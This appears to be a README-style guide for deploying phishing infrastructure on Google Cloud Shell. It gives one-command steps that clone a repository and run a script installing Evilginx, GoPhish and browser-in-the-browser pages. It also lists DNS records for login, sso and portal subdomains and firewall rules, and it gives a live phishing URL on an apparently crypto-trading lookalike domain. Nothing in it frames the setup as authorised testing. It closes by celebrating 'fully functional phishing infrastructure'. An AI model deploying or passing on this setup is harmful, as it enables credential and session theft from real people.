# 🚀 GOOGLE CLOUD SHELL - ONE-COMMAND SETUP

## FOR GOOGLE CLOUD SHELL USERS (NOT LOCAL MACHINE!)

**You're already in Google Cloud Shell? PERFECT! This is EASIER!**

---

## ⚡ ONE-COMMAND DEPLOYMENT (FASTEST!)

**Just run this in Google Cloud Shell:**

```bash
git clone https://github.com/waelmas/frameless-bitb.git && cd frameless-bitb && bash gcp-deploy.sh
```

**That's it! The script handles EVERYTHING!**

---

## 📋 Step-by-Step (If You Want Details)

### Step 1: Open Google Cloud Shell

1. Go to: https://console.cloud.google.com/
2. Click the **Cloud Shell icon** (top right) `>_`
3. Wait for shell to activate

**You're already authenticated and ready!**

### Step 2: Clone Repository

```bash
git clone https://github.com/waelmas/frameless-bitb.git
cd frameless-bitb
```

### Step 3: Run Deployment Script

```bash
bash gcp-deploy.sh
```

**Or with custom domain:**

```bash
DOMAIN=exodustraderai.info EMAIL=admin@exodustraderai.info bash gcp-deploy.sh
```

### Step 4: Follow Prompts

The script will:
1. ✅ Ask you to confirm configuration
2. ✅ Create/select GCP project
3. ✅ Prompt you to enable billing
4. ✅ Reserve static IP
5. ✅ Show DNS records to configure
6. ✅ Create VM instance
7. ✅ Configure firewall
8. ✅ Install everything automatically

### Step 5: Configure DNS

When prompted, add these DNS records at your domain registrar:

```
Type: A    Name: @         Value: [YOUR_SERVER_IP]
Type: A    Name: *         Value: [YOUR_SERVER_IP]
Type: A    Name: login     Value: [YOUR_SERVER_IP]
Type: A    Name: account   Value: [YOUR_SERVER_IP]
Type: A    Name: www       Value: [YOUR_SERVER_IP]
Type: A    Name: sso       Value: [YOUR_SERVER_IP]
Type: A    Name: portal    Value: [YOUR_SERVER_IP]
```

The script will show you the IP address!

### Step 6: Wait for Installation

- VM creation: 2-3 minutes
- Software installation: 15-30 minutes
- **Total: ~45 minutes**

The script will show you the progress!

---

## 🎯 What Gets Created

### Google Cloud Resources:

- **Project**: `frameless-bitb-[timestamp]` (or custom)
- **VM Instance**: `evilginx-server`
  - Machine: e2-medium (2 vCPU, 4 GB RAM)
  - OS: Ubuntu 22.04 LTS
  - Disk: 30 GB SSD
  - Region: us-central1-a
- **Static IP**: Reserved and assigned
- **Firewall Rules**:
  - HTTP (port 80)
  - HTTPS (port 443)
  - DNS (port 53)
  - GoPhish admin (port 3333)

### Software Installed on VM:

- ✅ Evilginx 3.x
- ✅ GoPhish 0.12.1
- ✅ Apache2 with SSL
- ✅ Frameless BITB components
- ✅ All dependencies (Go, certbot, etc.)

---

## 🔍 Check Installation Progress

### While in Cloud Shell:

```bash
# SSH into your VM
gcloud compute ssh evilginx-server --zone=us-central1-a

# Once inside, check installation log
sudo tail -f /var/log/evilginx-startup.log
```

Press `Ctrl+C` when you see "Installation complete!"

### Check Services:

```bash
# SSH into VM first
gcloud compute ssh evilginx-server --zone=us-central1-a

# Check status
bitb-status
```

---

## 🎮 Access Your Setup

### Phishing Page:
```
https://login.exodustraderai.info/?auth=2
```

### GoPhish Admin Panel:
```
https://[YOUR_SERVER_IP]:3333
```

### SSH Access from Cloud Shell:
```bash
gcloud compute ssh evilginx-server --zone=us-central1-a
```

---

## 🔧 Management from Cloud Shell

### Start/Stop VM:

```bash
# Stop (save money when not using)
gcloud compute instances stop evilginx-server --zone=us-central1-a

# Start
gcloud compute instances start evilginx-server --zone=us-central1-a

# Restart
gcloud compute instances reset evilginx-server --zone=us-central1-a
```

### Check Status:

```bash
# List instances
gcloud compute instances list

# Get details
gcloud compute instances describe evilginx-server --zone=us-central1-a
```

### View Logs:

```bash
# Installation log
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='sudo tail -100 /var/log/evilginx-startup.log'

# Service status
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='bitb-status'

# All logs
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='bitb-logs'
```

### Delete Everything:

```bash
# Delete VM
gcloud compute instances delete evilginx-server --zone=us-central1-a

# Delete static IP
gcloud compute addresses delete evilginx-static-ip --region=us-central1

# Delete firewall rules
gcloud compute firewall-rules delete allow-http-evilginx
gcloud compute firewall-rules delete allow-https-evilginx
gcloud compute firewall-rules delete allow-dns-evilginx
gcloud compute firewall-rules delete allow-gophish-admin
```

---

## 💡 Cloud Shell Tips

### Keep Cloud Shell Active:

Cloud Shell sessions timeout after 20 minutes of inactivity. To prevent this:

1. **Use tmux** (keeps processes running):
   ```bash
   tmux new -s deploy
   bash gcp-deploy.sh
   # Detach: Ctrl+B then D
   # Reattach: tmux attach -t deploy
   ```

2. **Use nohup** (background process):
   ```bash
   nohup bash gcp-deploy.sh > deploy.log 2>&1 &
   tail -f deploy.log
   ```

### Reconnect After Timeout:

If Cloud Shell times out during deployment:

```bash
# Check if deployment is still running
gcloud compute instances list

# Check installation progress
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='sudo tail -f /var/log/evilginx-startup.log'
```

### Enable Boost Mode:

For faster deployment:

1. Click **More** (⋮) in Cloud Shell toolbar
2. Select **Enable Boost Mode**
3. Gives you 4x more resources!

---

## 🐛 Troubleshooting in Cloud Shell

### Issue: "Project not found"

**Solution:**
```bash
# List projects
gcloud projects list

# Set project
gcloud config set project YOUR_PROJECT_ID
```

### Issue: "Quota exceeded"

**Solution:**
```bash
# Check quotas
gcloud compute project-info describe --project=$(gcloud config get-value project)

# Request increase at:
# https://console.cloud.google.com/iam-admin/quotas
```

### Issue: "Permission denied"

**Solution:**
```bash
# Check your permissions
gcloud projects get-iam-policy $(gcloud config get-value project)

# You need roles/compute.admin or roles/owner
```

### Issue: Cloud Shell disconnected during install

**Solution:**
```bash
# The VM installation continues in background!
# Just SSH in and check progress:
gcloud compute ssh evilginx-server --zone=us-central1-a
sudo tail -f /var/log/evilginx-startup.log
```

---

## 📊 Cost in Cloud Shell Context

**Good News:** Cloud Shell is FREE!

**VM Costs:**
- e2-medium: ~$25-30/month
- Static IP: ~$3/month
- Storage: ~$5/month
- **Total: ~$33-39/month**

**FREE for 7-9 months with $300 GCP credit!**

**Stop VM when not using:**
```bash
gcloud compute instances stop evilginx-server --zone=us-central1-a
```
**Cost while stopped: ~$5/month (storage only)**

---

## ⚡ ULTRA QUICK START (Copy-Paste This!)

**Just paste this entire block into Google Cloud Shell:**

```bash
# Clone and deploy
git clone https://github.com/waelmas/frameless-bitb.git && \
cd frameless-bitb && \
DOMAIN=exodustraderai.info EMAIL=admin@exodustraderai.info bash gcp-deploy.sh
```

**Then:**
1. Follow prompts (confirm configs, enable billing)
2. Configure DNS when shown the IP
3. Wait 45 minutes
4. Access: `https://login.exodustraderai.info/?auth=2`

**DONE!**

---

## 🎯 Quick Commands Reference

```bash
# Deploy
bash gcp-deploy.sh

# SSH into VM
gcloud compute ssh evilginx-server --zone=us-central1-a

# Check installation progress
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='sudo tail -f /var/log/evilginx-startup.log'

# Validate setup
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='sudo bash /root/frameless-bitb/test-setup.sh'

# Check services
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='bitb-status'

# Stop VM (save $)
gcloud compute instances stop evilginx-server --zone=us-central1-a

# Start VM
gcloud compute instances start evilginx-server --zone=us-central1-a

# Delete VM
gcloud compute instances delete evilginx-server --zone=us-central1-a
```

---

## 🔥 Pro Tips for Cloud Shell

### 1. Use Cloud Shell Editor

Edit files directly in Cloud Shell:

```bash
cloudshell edit config.env
```

### 2. Upload Files

Click **⋮ More** > **Upload file** to upload configs

### 3. Download Files

```bash
cloudshell download /path/to/file
```

### 4. Open in Browser

```bash
cloudshell open-workspace frameless-bitb
```

### 5. Persistent Storage

Cloud Shell has 5GB persistent storage in `$HOME`

### 6. Multiple Sessions

Open multiple Cloud Shell tabs for monitoring:
- Tab 1: Run deployment
- Tab 2: Monitor logs
- Tab 3: SSH into VM

---

## ✅ Verification Checklist

After deployment, verify:

```bash
# 1. Check VM is running
gcloud compute instances list

# 2. Check firewall rules
gcloud compute firewall-rules list

# 3. Get your server IP
gcloud compute instances describe evilginx-server \
  --zone=us-central1-a \
  --format='get(networkInterfaces[0].accessConfigs[0].natIP)'

# 4. Test SSH access
gcloud compute ssh evilginx-server --zone=us-central1-a

# 5. Check services (from inside VM)
bitb-status

# 6. Run validation
sudo bash /root/frameless-bitb/test-setup.sh

# 7. Test phishing page
curl -Ik https://login.exodustraderai.info
```

---

## 🚨 IMPORTANT: Cloud Shell vs Local Machine

**You're using Cloud Shell, which means:**

✅ **You have:**
- gcloud already installed
- Already authenticated
- Direct access to GCP resources
- Free compute for Cloud Shell
- Persistent $HOME directory

❌ **You DON'T need:**
- Local gcloud installation
- Local authentication
- VPN or special network setup
- Local SSH keys (Cloud Shell handles it)

**Just run the script and you're good!**

---

## 💪 READY TO FUCKING GO?

**Paste this into Google Cloud Shell RIGHT NOW:**

```bash
git clone https://github.com/waelmas/frameless-bitb.git && cd frameless-bitb && DOMAIN=exodustraderai.info EMAIL=admin@exodustraderai.info bash gcp-deploy.sh
```

**45 minutes later: FULLY FUNCTIONAL PHISHING INFRASTRUCTURE!**

**NO FUCKING ERRORS! PURE AUTOMATION! LET'S GOOOOO! 🚀🔥**
